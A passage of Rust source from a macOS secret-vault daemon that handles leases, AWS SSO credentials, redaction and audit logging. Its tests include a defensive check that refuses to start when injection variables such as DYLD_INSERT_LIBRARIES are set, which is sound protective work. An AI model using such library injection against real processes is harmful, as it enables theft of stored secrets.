    /// Child body for the test below: lives a few seconds, only when started by it.
    #[test]
    fn dyld_probe_sleeper() {
        if std::env::var_os("KARAMBIT_DYLD_PROBE").is_some() { std::thread::sleep(Duration::from_secs(6)); }
    }

    #[test]
    fn kernel_environment_of_a_live_process_lists_injected_dyld_names() {
        // The real procargs reader (what verify_daemon uses outside tests) on a non-SIP child
        // (this test binary), whose environment the kernel shows to the same user.
        let mut child = std::process::Command::new(std::env::current_exe().unwrap())
            .args(["--exact", "daemon::verify_daemon_tests::dyld_probe_sleeper", "--nocapture"])
            .env("DYLD_KARAMBIT_PROBE", "1").env("KARAMBIT_DYLD_PROBE", "1")
            .stdout(std::process::Stdio::null()).stderr(std::process::Stdio::null()).spawn().unwrap();
        let until = Instant::now() + Duration::from_secs(5);
        let names = loop {
            match agent::proc_env_names(child.id() as i32) {
                Some(names) if names.iter().any(|n| n == "KARAMBIT_DYLD_PROBE") => break names,
                _ if Instant::now() > until => { let _ = child.kill(); let _ = child.wait(); panic!("child environment never readable"); }
                _ => std::thread::sleep(Duration::from_millis(20)),
            }
        };
        let _ = child.kill();
        let _ = child.wait();
        assert!(names.iter().any(|n| n == "DYLD_KARAMBIT_PROBE"), "{names:?}");
        // The kernel's own applev entries (e.g. dyld_file) are lowercase and must not trip the check.
        assert!(dyld_name(names.iter().filter(|n| *n != "DYLD_KARAMBIT_PROBE" && !n.starts_with("DYLD_FALLBACK"))).is_none(), "{names:?}");
        assert!(dyld_name(&names).is_some());
        assert_eq!(dyld_name(["PATH", "HOME"]), None);
    }

    #[test]
    fn daemon_entry_refuses_its_own_dyld_environment() {
        use std::ffi::OsString;
        let names = |n: &[&str]| n.iter().map(OsString::from).collect::<Vec<_>>();
        let error = ensure_no_dyld_environment(names(&["PATH", "DYLD_INSERT_LIBRARIES"])).unwrap_err().to_string();
        assert!(error.contains("DYLD_INSERT_LIBRARIES") && error.contains("refusing to start"), "{error}");
        ensure_no_dyld_environment(names(&["PATH", "XDYLD_FOO", "dyld_lower"])).unwrap();
        ensure_no_dyld_environment(names(&[])).unwrap();
    }

    #[test]
    fn missing_pin_is_refused_once_the_vault_is_initialized() {
        for marker in [Path::new("keys").join("pub.json"), Path::new("keys").join("bio.key"), PathBuf::from("config.json")] {
            let e = Endpoint::new(None);
            let (fake, _) = fake_binary(&e.root, b"anything");
            exe_is(fake);
            // Not initialized yet: nothing to verify against.
            verify_daemon(&e.socket, &e.connect()).unwrap();
            std::fs::write(e.root.join(&marker), "{}").unwrap();
            let error = refused(&e);
            assert!(error.starts_with(UNTRUSTED_DAEMON) && error.contains("pin is missing"), "{marker:?}: {error}");
            // Writing the pin (as first start does) restores service.
            std::fs::write(e.root.join("keys").join("daemon.sha256"), own_hash()).unwrap();
            exe_is(PathBuf::from(agent::proc_exe(std::process::id() as i32).unwrap()));
            verify_daemon(&e.socket, &e.connect()).unwrap();
        }
    }

    #[test]
    fn vault_root_that_is_a_symlink_is_judged_by_its_target() {
        let e = Endpoint::new(Some(&own_hash()));
        let link = PathBuf::from("/tmp").join(format!("karambit-verify-link-{:016x}", rand::random::<u64>()));
        symlink(&e.root, &link).unwrap();
        let result = verify_daemon(&link.join("run").join(SOCK), &e.connect());
        // A pin-less symlinked vault must not slip through as "uninitialized" either.
        std::fs::write(e.root.join("config.json"), "{}").unwrap();
        std::fs::remove_file(e.root.join("keys").join("daemon.sha256")).unwrap();
        let missing = verify_daemon(&link.join("run").join(SOCK), &e.connect());
        // run/ itself must still not be a link.
        std::fs::write(e.root.join("keys").join("daemon.sha256"), own_hash()).unwrap();
        let real_run = e.root.join("run");
        let moved = e.root.join("run-real");
        std::fs::rename(&real_run, &moved).unwrap();
        symlink(&moved, &real_run).unwrap();
        let run_link = verify_daemon(&link.join("run").join(SOCK), &e.connect());
        std::fs::remove_file(&real_run).unwrap();
        std::fs::rename(&moved, &real_run).unwrap();
        std::fs::remove_file(&link).unwrap();
        result.unwrap();
        assert!(missing.unwrap_err().to_string().contains("pin is missing"));
        assert!(run_link.unwrap_err().to_string().contains("not private to this user"));
    }

    #[test]
    fn only_stop_and_repin_may_reach_a_daemon_that_does_not_match_the_pin() {
        assert!(recovers_pin(&Req::Shutdown));
        assert!(recovers_pin(&Req::HelperPin { stage_daemon: None, stage_helper: None }));
        assert!(!recovers_pin(&Req::StatusSelftest));
        assert!(!recovers_pin(&Req::Add { name: "x/y".into(), value: "v".into(), tier: None, agent_allowed: false, public: false, overwrite: false }));
    }

    #[test]
    fn request_sends_nothing_to_an_unverified_daemon() {
        // The `add` value travels in the request: a fake daemon must see zero bytes.
        let root = PathBuf::from("/tmp").join(format!("karambit-verify-{:016x}", rand::random::<u64>()));
        let p = Paths { root: root.clone() };
        store::ensure_dir(&run_dir(&p)).unwrap();
        store::ensure_dir(&p.keys()).unwrap();
        std::fs::write(p.keys().join("daemon.sha256"), "0".repeat(64)).unwrap();
        let listener = UnixListener::bind(sock_path(&p)).unwrap();
        let server = std::thread::spawn(move || {
            let (mut c, _) = listener.accept().unwrap();
            c.set_read_timeout(Some(Duration::from_secs(2))).unwrap();
            let mut seen = Vec::new();
            let _ = c.read_to_end(&mut seen);
            seen
        });
        let err = request(&p, &Req::Add { name: "x/y".into(), value: "hunter2".into(), tier: None, agent_allowed: false, public: false, overwrite: false }).unwrap_err();
        assert!(err.to_string().starts_with(UNTRUSTED_DAEMON), "{err}");
        assert!(server.join().unwrap().is_empty(), "request bytes reached an unverified daemon");
        let _ = std::fs::remove_dir_all(root);
    }
}

fn spawn(p: &Paths) -> Result<()> {
    // Tests must never launch a real (installed) daemon binary.
    #[cfg(test)]
    { let _ = p; anyhow::bail!("test build: refusing to spawn a karambit daemon"); }
    #[cfg(not(test))]
    spawn_real(p)
}

#[cfg(not(test))]
fn spawn_real(p: &Paths) -> Result<()> { crate::platform::spawn_daemon(p) }

// ---------------------------------------------------------------- server

struct Held {
    info: LeaseInfo,
    dek: Dek,
    root: Option<(i32, u64)>,
    scope: Scope,
    uses: u32,
}

struct AwsEp {
    caller: agent::Caller,
    profile: String,
    creds: Zeroizing<String>,
    token: String,
    expires: Instant,
    /// SSO-backed endpoint: role creds are minted and refreshed from the session.
    sso: Option<String>,
    binding: Option<SsoBinding>,
    /// Bound SSO launch that owns this endpoint: its owner redacts what the target prints,
    /// so minted role credentials must reach that redactor before the target gets them.
    launch: Option<String>,
    /// The human approved `--no-redact` for the launch that owns this endpoint: no owner
    /// redactor exists to feed, for the endpoint's whole life (not just the prepare window).
    unredacted: bool,
}

/// Daemon-owned identities; never accepted from a client. Tombstones prevent ABA.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(crate) struct SsoBinding {
    registration: u64,
    portal: String,
    session: u64,
}

impl State {
    // Pure containment: remove both sides in the same State critical section,
    // before any potentially blocking best-effort audit.
    fn reconcile_launch_endpoints(&mut self) {
        let endpoints = self.aws.keys().cloned().collect();
        for id in self.pending_launches.reconcile_endpoints(&endpoints) { self.aws.remove(&id); }
        let at = now();
        self.launch_redactions.retain(|id, r| at < r.expires_at && self.pending_launches.redaction_live(id, r.owner, r.shim, at));
    }

    fn registration_revision(&self, name: &str) -> u64 {
        self.registration_revisions.get(name).copied().unwrap_or(0)
    }

    fn session_revision(&self, portal: &str) -> u64 {
        self.session_revisions.get(portal).copied().unwrap_or(0)
    }

    fn invalidate_registration(&mut self, name: &str) {
        let revision = self.registration_revisions.entry(name.to_string()).or_default();
        *revision = revision.checked_add(1).expect("SSO revision exhausted");
        self.sso_creds.remove(name);
        self.aws.retain(|_, ep| ep.sso.as_deref() != Some(name));
    }

    fn invalidate_session(&mut self, portal: &str) {
        let revision = self.session_revisions.entry(portal.to_string()).or_default();
        *revision = revision.checked_add(1).expect("SSO revision exhausted");
        let names: Vec<_> = self.sso_profiles.iter().filter(|(_, r)| r.profile.portal == portal).map(|(n, _)| n.clone()).collect();
        for name in names { self.invalidate_registration(&name); }
    }

    fn binding(&self, name: &str) -> Result<SsoBinding> {
        let portal = reg_portal(self, name)?;
        self.sso.get(&portal).ok_or_else(|| portal_gone(self, &portal))?;
        Ok(SsoBinding { registration: self.registration_revision(name), session: self.session_revision(&portal), portal })
    }

    fn check_binding(&self, name: &str, binding: &SsoBinding) -> Result<()> {
        if self.binding(name)? != *binding { bail!("SSO registration/session changed; retry"); }
        Ok(())
    }

    fn check_endpoint(&self, id: &str) -> Result<()> {
        let ep = self.aws.get(id).filter(|ep| ep.expires > Instant::now()).context("AWS endpoint ended; retry")?;
        if let Some(name) = &ep.sso {
            let binding = ep.binding.as_ref().context("missing SSO binding")?;
            self.check_binding(name, binding)?;
            if self.sso[&binding.portal].limit_passed() { bail!("AWS sign-in limit passed"); }
        }
        Ok(())
    }
}

#[cfg(test)]
type SsoTestHook = (&'static str, Box<dyn FnOnce()>);
#[cfg(test)]
thread_local! {
    static SSO_TEST_HOOK: std::cell::RefCell<Option<SsoTestHook>> = const { std::cell::RefCell::new(None) };
}
#[cfg(test)]
fn sso_test_checkpoint(point: &str) {
    let hook = SSO_TEST_HOOK.with(|slot| {
        let mut slot = slot.borrow_mut();
        if slot.as_ref().is_some_and(|(p, _)| *p == point) { slot.take() } else { None }
    });
    if let Some((_, hook)) = hook { hook(); }
}

fn validate_sso_registration(reg: &crate::sso::SsoReg) -> Result<()> {
    store::validate_name(&reg.name)?;
    reg.profile.validate()?;
    let valid_hash = reg.dek_sha256.as_ref().is_some_and(|h| h.len() == 64 && h.bytes().all(|b| b.is_ascii_digit() || (b'a'..=b'f').contains(&b)));
    if (reg.tier == store::Tier::Bio || reg.dek_sha256.is_some()) && !valid_hash {
        bail!("{} needs a valid SHA-256 DEK binding", reg.name);
    }
    Ok(())
}

/// Role credentials cached per SSO profile, refreshed before they expire.
struct SsoCreds {
    creds: Zeroizing<String>,
    issued: u64,
    expires_at: u64,
    binding: SsoBinding,
}

// Value-bearing storage is separate from the reference-only launch registry.
// Every entry is backed by one capacity-counted Finalized/Delivered record.
struct LaunchRedaction {
    caller: agent::Caller,
    owner: agent::ProcessIdentity,
    shim: agent::ProcessIdentity,
    expires_at: u64,
    frame: Zeroizing<Vec<u8>>,
    /// SSO launch: the owner keeps its connection open for later redaction additions.
    updates: bool,
}

/// Role credentials queued for an owner's redactor. Each fetch of a launch-bound SSO
/// endpoint queues its secret parts here and is answered only after the owner acknowledged.
#[derive(Default)]
struct RedactionFeed {
    next: u64,
    queue: Vec<FeedUpdate>,
    /// Hashes of value sets the owner already acknowledged (re-served cached creds need no round trip).
    acked: std::collections::HashSet<String>,
}

struct FeedUpdate {
    seq: u64,
    hash: String,
    values: Vec<(String, Zeroizing<String>)>,
    sent: bool,
}

/// How long a fetch waits for the owner to learn new role credentials before the SDK is told to retry.
const REDACTION_ACK_WAIT: Duration = Duration::from_secs(2);

#[derive(Default)]
pub(crate) struct State {
    killed: crate::policy::Killed,
    // Diagnostic snapshot only: never used to authorize after a failed reload.
    last_good_policy: Option<crate::policy::Policy>,
    pending_launches: crate::launch::PendingLaunches,
    launch_redactions: HashMap<String, LaunchRedaction>,
    /// `RunUnredacted` approvals not yet spent by a `LaunchPrepare`: (owner, command, deadline).
    unredacted_approvals: Vec<(agent::ProcessIdentity, String, u64)>,
    /// Present while an SSO launch's owner is connected for redaction additions.
    redaction_feeds: HashMap<String, RedactionFeed>,
    leases: HashMap<String, Held>,
    lease_revision: u64,
    /// Human self-leases ("Only me + Touch ID"): no scope, ended when the screen locks.
    human: HashMap<(i32, u64, String), Held>,
    aws: HashMap<String, AwsEp>,
    /// AWS SSO sessions by portal name.
    sso: HashMap<String, crate::sso::Session>,
    sso_profiles: HashMap<String, crate::sso::SsoReg>,
    sso_creds: HashMap<String, SsoCreds>,
    registration_revisions: HashMap<String, u64>,
    session_revisions: HashMap<String, u64>,
    /// Why a portal's last sign-in ended by itself (AWS wouldn't renew it, or its sign-in
    /// limit passed), for `sso_status` and agents' errors. Cleared by sign-in or sign-out.
    sso_ended: HashMap<String, Ended>,
    /// Last renewal error per portal, when it's worth retrying (network, AWS outage).
    sso_trouble: HashMap<String, String>,
    last_activity: Option<Instant>,
}

impl State {
    fn keeps_alive(&self, at: u64) -> bool {
        // Pending launches are in-flight until the sweep burns them. Burned
        // tombstones do not keep an otherwise idle daemon alive.
        !self.leases.is_empty() || !self.human.is_empty() || !self.aws.is_empty()
            || self.sso.values().any(|s| s.refresh_token.is_some() || s.access_expires_at > at)
            || self.pending_launches.has_pending() || self.pending_launches.has_live_bound(at)
    }
}

/// Daemon context: backend locks are never nested with legacy State.
pub(crate) struct Ctx {
    state: Mutex<State>,
    backends: Backends,
}
impl std::ops::Deref for Ctx {
    type Target = Mutex<State>;
    fn deref(&self) -> &Self::Target { &self.state }
}
impl Ctx {
    fn new(state: State) -> Self {
        Self { state: Mutex::new(state), backends: Backends::default() }
    }
}
struct SourceRuntime {
    // Preserve both clocks for cached reads and map lifecycle invalidation to AuthExpired.
    login_window: Option<(Instant, u64)>,
    scopes: Arc<BackendScopes>,
    backend: Arc<dyn crate::backend::SecretBackend>,
    config: crate::backend::SourceConfig,
    service: Arc<crate::backend::BackendService>,
}
fn source_login_window(binding: &crate::backend::Binding, at: crate::backend::Time) -> Option<(Instant, u64)> {
    if let crate::backend::Expiry::At(expires) = binding.login_expires_at {
        Some((at.monotonic + Duration::from_secs(expires.saturating_sub(at.wall)), expires))
    } else { None }
}
fn source_login_expired(st: &Ctx, source: &str) -> bool {
    let at = st.backends.clock.now();
    st.backends.runtime.lock().unwrap().sources.get(source).and_then(|r| r.login_window)
        .is_some_and(|(mono, wall)| at.monotonic >= mono || at.wall >= wall)
}
#[derive(Default)]
struct BackendRuntime {
    sources: HashMap<String, SourceRuntime>,
    // Retired services retain old credentials solely for pending cleanup.
    retired: Vec<Arc<crate::backend::BackendService>>,
    sessions: HashMap<(i32, u64), u64>,
    next_session: u64,
    grants: HashMap<(u64, String), BackendGrant>,
}
struct BackendGrant {
    id: crate::backend::GrantId,
    reference: String,
    expires: Instant,
    expires_wall: u64,
}
struct Backends {
    registry: Arc<crate::backend::Registry>,
    clock: Arc<dyn crate::backend::Clock>,
    upstream_max_ttl: Option<Duration>,
    runtime: Mutex<BackendRuntime>,
}
impl Default for Backends {
    fn default() -> Self {
        Self { registry: Arc::new(crate::backend::production_registry()), runtime: Mutex::new(BackendRuntime::default()),
            clock: Arc::new(BackendClock), upstream_max_ttl: None }
    }
}
impl Backends {
    fn services(&self) -> Vec<Arc<crate::backend::BackendService>> {
        let g = self.runtime.lock().unwrap();
        g.sources.values().map(|s| s.service.clone()).chain(g.retired.iter().cloned()).collect()
    }
    fn tick(&self) -> bool {
        let mut live = false;
        let mut finished = Vec::new();
        for service in self.services() {
            service.tick(self.clock.now());
            let status = service.status();
            live |= status.owners > 0 || !status.pending_revoke.is_empty();
            // A flight retains a service Arc, even before it discovers an issue.
            // Never drop its only future cleanup owner while that flight runs.
            if status.owners == 0 && status.pending_revoke.is_empty() && Arc::strong_count(&service) == 2 {
                finished.push(Arc::as_ptr(&service));
            }
        }
        let at = self.clock.now();
        let mut g = self.runtime.lock().unwrap();
        g.retired.retain(|s| !finished.contains(&Arc::as_ptr(s)));
        g.grants.retain(|_, grant| grant.expires > at.monotonic && grant.expires_wall > at.wall);
        live
    }
    fn invalidate(&self, name: &str) -> Option<SourceRuntime> {
        let old = {
            let mut g = self.runtime.lock().unwrap();
            g.grants.retain(|(_, source), _| source != name);
            let old = g.sources.remove(name);
            if let Some(r) = &old { g.retired.push(r.service.clone()); }
            old
        };
        if let Some(runtime) = &old { runtime.service.retarget(None); }
        old
    }
}
struct BackendClock;
impl crate::backend::Clock for BackendClock {
    fn now(&self) -> crate::backend::Time {
        crate::backend::Time { wall: now(), monotonic: Instant::now() }
    }
}
struct BackendAudit { paths: Paths, caller: agent::Caller }
impl crate::backend::AuditSink for BackendAudit {
    fn append(&self, r: &crate::backend::AuditRecord) -> crate::backend::BResult<()> {
        use crate::backend::{Expiry, Revocation};
        fn expiry(value: Expiry) -> Value {
            match value {
                Expiry::At(at) => json!(at),
                Expiry::Unknown => json!("unknown"),
                Expiry::NotApplicable => json!("not_applicable"),
            }
        }
        let clocks = r.clocks.as_ref().map(|c| json!({
            "permission_expires_at": expiry(c.permission_expires_at),
            "login_expires_at": expiry(c.login_expires_at),
            "credential_expires_at": expiry(c.credential_expires_at),
            "cache_fresh_until": expiry(c.cache_fresh_until),
            "revocation": match c.revocation {
                Revocation::None => "none", Revocation::Pending => "pending",
                Revocation::Acknowledged => "acknowledged",
                Revocation::ExpiredUnconfirmed => "expired-unconfirmed", Revocation::Unsupported => "unsupported",
            },
        }));
        let result = r.error.map_or(Ok(()), |error| Err(anyhow!(error)));
        crate::audit::log(&self.paths, crate::audit::Event {
            action: "backend", secrets: &[], caller: &self.caller,
            detail: json!({"operation": r.operation, "phase": format!("{:?}", r.phase),
                "action": r.action, "source": r.source, "kind": r.kind, "binding": r.binding,
                "grant": r.grant.map(|v| format!("{v:?}")), "session": r.session.map(|v| format!("{v:?}")),
                "ref": r.issuance, "selectors": r.selectors, "mode": r.mode, "cache_hit": r.cache_hit,
                "clocks": clocks, "version": r.version,
                "etag": r.etag, "lease_id": r.lease_id.as_ref().map(|v| v.as_str()),
                "error": r.error.map(|v| v.to_string())}), result: &result,
        }).map_err(|_| crate::backend::BackendError::AuditUnavailable)
    }
}
// Scope is granted only for one exact native ref (including selector). Service owns
// session, expiry, use consumption and binding revision rechecks.
#[derive(Default)]
struct BackendScopes(Mutex<Vec<(crate::backend::GrantId, crate::backend::SessionId, String, String)>>);
impl crate::backend::Authorize for BackendScopes {
    fn allow(&self, grant: crate::backend::GrantId, session: crate::backend::SessionId, issuance: &str, selector: &str) -> bool {
        self.0.lock().unwrap().iter().any(|(g, s, r, f)| *g == grant && *s == session && r == issuance && f == selector)
    }
}

struct Ended {
    at: u64,
    why: String,
    limit: bool,
}

// Only daemon dispatch and its containment probe install launch authority.
// The private field prevents client/library code from constructing this token.
pub(crate) struct LaunchCap(());
thread_local! {
    static LAUNCH_CAP: std::cell::RefCell<Option<Arc<LaunchCap>>> = const { std::cell::RefCell::new(None) };
}
fn launch_scope<T>(f: impl FnOnce() -> T) -> T {
    struct Restore(Option<Arc<LaunchCap>>);
    impl Drop for Restore {
        fn drop(&mut self) { LAUNCH_CAP.with(|slot| *slot.borrow_mut() = self.0.take()); }
    }
    let _restore = Restore(LAUNCH_CAP.with(|slot| slot.replace(Some(Arc::new(LaunchCap(()))))));
    f()
}
pub(crate) fn with_launch_cap<T>(f: impl FnOnce(&LaunchCap) -> Result<T>) -> Result<T> {
    let cap = LAUNCH_CAP.with(|slot| slot.borrow().clone());
    // Unit fixtures cannot execute helpers (helper.rs retains its panic guards).
    #[cfg(test)]
    let cap = cap.unwrap_or_else(|| Arc::new(LaunchCap(())));
    #[cfg(not(test))]
    let cap = cap.context("helper launch requires daemon dispatch")?;
    f(&cap)
}

pub fn serve(p: Paths) -> Result<()> {
    build_id(); // hash the executable we started from, before anything can replace it
    let dir = run_dir(&p);
    store::ensure_dir(&dir)?;
    std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700))?;
    let sock = sock_path(&p);
    // A live daemon already owns the socket: don't steal it.
    if UnixStream::connect(&sock).is_ok() {
        return Ok(());
    }
    let _ = std::fs::remove_file(&sock);
    let listener = UnixListener::bind(&sock).with_context(|| format!("bind {}", sock.display()))?;
    std::fs::set_permissions(&sock, std::fs::Permissions::from_mode(0o600))?;
    // Old on-disk lease copies are replaced by RAM-only leases.
    let _ = std::fs::remove_dir_all(crate::lease::dir(&p));
    unsafe { libc::signal(libc::SIGPIPE, libc::SIG_IGN) };

    let state = Arc::new(Ctx::new(State { last_activity: Some(Instant::now()), ..Default::default() }));
    let me_uid = unsafe { libc::getuid() };

    // AWS endpoint server: one loopback listener, routed by bearer token.
    let http = TcpListener::bind("127.0.0.1:0")?;
    let http_port = http.local_addr()?.port();
    {
        let st = state.clone();
        let p = p.clone();
        std::thread::spawn(move || {
            for c in http.incoming().flatten() {
                let st = st.clone();
                let p = p.clone();
                std::thread::spawn(move || {
                    let _ = serve_aws(c, &st, &p);
                });
            }
        });
    }

    // AWS SSO keeper: end sign-ins past their limit, and renew tokens shortly before
    // they expire, so a sign-in AWS has ended shows as signed out even while no agent
    // uses it. Trouble worth retrying (network, AWS outage) is retried a minute later.
    {
        let st = state.clone();
        let p = p.clone();
        std::thread::spawn(move || {
            let mut retry_at: HashMap<String, u64> = HashMap::new();
            loop {
                std::thread::sleep(Duration::from_secs(5));
                let due = {
                    let g = st.lock().unwrap();
                    retry_at.retain(|k, _| g.sso.contains_key(k));
                    sso_due(&g, now(), &retry_at)
                };
                for portal in due {
                    match sso_renew(&st, &p, &portal, 120, None) {
                        Err(e) if e.downcast_ref::<crate::sso::SessionEnded>().is_none() => {
                            retry_at.insert(portal, now() + 60);
                        }
                        _ => {
                            retry_at.remove(&portal);
                        }
                    }
                }
            }
        });
    }

    // Reaper: expire leases + endpoints, exit when idle.
    {
        let st = state.clone();
        let p = p.clone();
        let sock = sock.clone();
        std::thread::spawn(move || loop {
            std::thread::sleep(Duration::from_secs(5));
            expire_launches(&p, &st, now());
            let has_human = expire_leases(&p, &st, now());
            // End human self-leases the moment the screen locks (probe outside the lock).
            if has_human && launch_scope(|| crate::platform::helper::screen_locked(&p.keys())) {
                let dropped = {
                    let mut g = st.lock().unwrap();
                    let d: Vec<String> = g.human.keys().map(|(_, _, name)| name.clone()).collect();
                    g.human.clear();
                    g.lease_revision += 1;
                    d
                };
                if !dropped.is_empty() {
                    log_event(&p, "lease-ended", &dropped, json!({"why": "screen locked"}));
                }
            }
            let backend_live = st.backends.tick();
            let g = st.lock().unwrap();
            let idle = may_idle_exit(g.last_activity);
            if !backend_live && !g.keeps_alive(now()) && idle {
                let _ = std::fs::remove_file(&sock);
                std::process::exit(0);
            }
        });
    }

    for conn in listener.incoming() {
        let Ok(c) = conn else { continue };
        let st = state.clone();
        let p = p.clone();
        std::thread::spawn(move || serve_connection(p, st, c, me_uid, http_port));
    }
    Ok(())
}

fn serve_connection(p: Paths, st: Arc<Ctx>, mut c: UnixStream, me_uid: libc::uid_t, http_port: u16) {
    // Counts legacy requests through delivery; Bind drops this before its idle wait.
    let busy = InFlight::enter();
    let resp = match peer_of(&c, me_uid) {
        Ok(peer_pid) => {
            let mut buf = Zeroizing::new(String::new());
            let _ = c.set_read_timeout(Some(Duration::from_secs(10)));
            let Ok(read_socket) = c.try_clone() else { return };
            let mut reader = BufReader::new(read_socket);
            let _ = reader.read_line(&mut buf);
            let parsed = serde_json::from_str::<Req>(buf.trim());
            #[cfg(test)]
            if let Ok(req) = &parsed { CLI_REQUEST_OBSERVER.with(|h| { if let Some(hook) = h.borrow().as_ref() { hook(req); } }); }
            match parsed {
                Ok(Req::LaunchRedaction { id }) => {
                    let result = peer_token_of(&c, me_uid).and_then(|(pid, version)| {
                        // Test-only: simulate a socket created by an earlier incarnation.
                        #[cfg(test)]
                        let version = if run_dir(&p).join("stale-version").exists() { version.wrapping_add(1) } else { version };
                        launch_scope(|| release_launch_redaction(&p, &st, pid, version, &id, &mut c))
                    });
                    match result {
                        Err(_) => { let _ = write_response(&mut c, &json!({"error":"launch refused"})); }
                        Ok(None) => (),
                        // SSO launch: the owner stays connected for later redaction additions.
                        Ok(Some((owner, shim))) => {
                            drop(busy);
                            launch_scope(|| serve_redaction_feed(&p, &st, &mut c, &id, &|g| g.pending_launches.redaction_live(&id, owner, shim, now())));
                        }
                    }
                    return;
                }
                Ok(Req::LaunchBind { id }) => {
                    launch_scope(|| serve_launch_bind(&p, &st, &mut c, &mut reader, peer_pid, &id, busy, http_port));
                    return;
                }
                Ok(req) => {
                    #[derive(Deserialize)]
                    struct Correlation { audit_parent: Option<String> }
                    let wire: Correlation = serde_json::from_str(buf.trim()).unwrap_or(Correlation { audit_parent: None });
                    let parent = wire.audit_parent.as_deref().filter(|s| s.len() <= 64);
                    match handle_correlated(&p, &st, peer_pid, req, http_port, parent, |resp| {
                        write_response(&mut c, &resp)?;
                        Ok(resp)
                    }) {
                        Ok(_) => {
                            st.lock().unwrap().last_activity = Some(Instant::now());
                            return;
                        }
                        Err(e) => json!({"error": format!("{e:#}")}),
                    }
                },
                Err(e) => json!({"error": format!("bad request: {e}")}),
            }
        }
        Err(e) => json!({"error": format!("{e:#}")}),
    };
    st.lock().unwrap().last_activity = Some(Instant::now());
    let _ = write_response(&mut c, &resp);
}

/// Requests currently being handled. The idle reaper must not exit while any request
/// is in flight (e.g. waiting on Touch ID or rewrapping), whatever `last_activity` says.
static IN_FLIGHT: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);

struct InFlight;
impl InFlight {
    fn enter() -> Self { IN_FLIGHT.fetch_add(1, std::sync::atomic::Ordering::SeqCst); InFlight }
}
impl Drop for InFlight {
    fn drop(&mut self) { IN_FLIGHT.fetch_sub(1, std::sync::atomic::Ordering::SeqCst); }
}

fn may_idle_exit(last_activity: Option<Instant>) -> bool {
    IN_FLIGHT.load(std::sync::atomic::Ordering::SeqCst) == 0
        && last_activity.is_none_or(|a| a.elapsed() > Duration::from_secs(IDLE_SECS))
}

#[cfg(test)]
#[test]
fn idle_exit_waits_for_in_flight_requests() {
    // Aged activity with a request in flight (e.g. blocked in AUTH) must not idle-exit.
    let aged = Instant::now().checked_sub(Duration::from_secs(IDLE_SECS + 60));
    let busy = InFlight::enter();
    assert!(!may_idle_exit(aged));
    assert!(!may_idle_exit(None));
    drop(busy);
}

fn write_response(writer: &mut impl Write, response: &Value) -> Result<()> {
    let mut line = serde_json::to_vec(response)?;
    line.push(b'\n');
    writer.write_all(&line)?;
    Ok(())
}

/// Peer pid from the kernel audit token. Refuses other users.
fn peer_of(c: &UnixStream, me_uid: libc::uid_t) -> Result<i32> {
    Ok(peer_token_of(c, me_uid)?.0)
}

/// Peer pid + pidversion from the kernel audit token. pidversion is unique per
/// process incarnation, so it binds the socket to the process that created it.
use crate::platform::{peer_token_of, live_pidversion};

/// Identifies the running daemon build: crate version plus a prefix of its executable's
/// SHA-256, taken once so a later reinstall can't make a stale daemon look current.
pub fn build_id() -> &'static str {
    static ID: std::sync::OnceLock<String> = std::sync::OnceLock::new();
    ID.get_or_init(|| {
        let hash = std::env::current_exe().ok().and_then(|exe| crate::helper::sha256_file(&exe).ok());
        format!("{}+{}", env!("CARGO_PKG_VERSION"), hash.as_deref().map_or("unknown", |h| &h[..12]))
    })
}

/// SHA-256 of the policy this daemon last loaded from config.json (empty policy if none).
fn loaded_policy_sha256(st: &Ctx) -> String {
    let policy = st.lock().unwrap().last_good_policy.clone().unwrap_or_default();
    crate::policy::diagnostics::policy_sha256(&policy)
}

fn log_event(p: &Paths, action: &str, secrets: &[String], detail: Value) {
    let sys = crate::agent::Caller { chain: vec!["karambit-daemon".into()], ..Default::default() };
    if let Err(e) = crate::audit::log(p, crate::audit::Event { action, secrets, caller: &sys, detail, result: &Ok(()) }) {
        eprintln!("karambit: daemon audit event failed: {e:#}");
    }
}

#[cfg(test)]
fn handle(p: &Paths, st: &Ctx, peer_pid: i32, req: Req, http_port: u16) -> Result<Value> {
    handle_correlated(p, st, peer_pid, req, http_port, None, Ok)
}

/// Names a human approves in a Touch ID prompt, with the count: "3 secrets: a, b, c".
/// The helper shows at most 120 characters of a field, so a longer list is refused
/// rather than cut off, which could hide the one secret that matters.
fn approval_names(names: &[String]) -> Result<String> {
    let text = format!("{} secret{}: {}", names.len(), if names.len() == 1 { "" } else { "s" }, names.join(", "));
    if crate::platform::helper::prompt_param(&text) != text {
        bail!("too many secrets for one prompt; grant fewer or use a narrower pattern");
    }
    Ok(text)
}

/// Replace the diagnostic snapshot only after complete config validation. An invalid
/// reload refuses this request; it never falls back to the retained policy.
fn load_policy_config(p: &Paths, st: &Ctx) -> Result<store::Config> {
    let cfg = store::load_config(p).map_err(|_| anyhow::anyhow!("policy.invalid_config; reload refused; last good snapshot retained"))?;
    st.lock().unwrap().last_good_policy = cfg.policy.clone();
    Ok(cfg)
}

fn handle_correlated(p: &Paths, st: &Ctx, peer_pid: i32, req: Req, http_port: u16, client_parent: Option<&str>, deliver: impl FnOnce(Value) -> Result<Value>) -> Result<Value> {
    let cfg = load_policy_config(p, st)?;
    let peer = agent::detect_peer(&cfg, peer_pid);
    handle_as(p, st, peer, req, http_port, client_parent, deliver)
}

/// Internal dispatch preserves the original kernel peer for nested operations.
/// No state guard is held across this call or response delivery.
fn handle_as(p: &Paths, st: &Ctx, peer: agent::Peer, req: Req, http_port: u16, client_parent: Option<&str>, deliver: impl FnOnce(Value) -> Result<Value>) -> Result<Value> {
    expire_launches(p, st, now());
    launch_scope(|| handle_as_scoped(p, st, peer, req, http_port, client_parent, deliver))
}

fn handle_as_scoped(p: &Paths, st: &Ctx, peer: agent::Peer, req: Req, http_port: u16, client_parent: Option<&str>, deliver: impl FnOnce(Value) -> Result<Value>) -> Result<Value> {
    check_agent_access(p, st, &peer.caller)?;
    // Limit shortening is containment, while equal/longer changes require an
    // intent. Let the persisted-state classifier enclose delivery too, avoiding
    // two classifications racing one another. No config/State lock spans I/O.
    if let Req::SsoPortalLimit { portal, minutes } = &req {
        if let Some(verb) = crate::fence::request_verb(&req) {
            crate::fence::require_human(&peer.caller, verb, crate::fence::Layer::Daemon)?;
        }
        return peer_vault(p, &peer)?.sso_portal_limit_internal(portal, *minutes,
            |req| handle_as(p, st, peer.clone(), req, http_port, None, Ok),
            |ended| deliver(json!(ended)));
    }
    let peer_pid = peer.pid;
    let action = match &req {
        Req::ProfileTrust { .. } => Some("daemon-profile-trust"),
        Req::Kill { .. } => Some("daemon-agent-containment"),
        Req::Call { .. } => Some("daemon-call"),
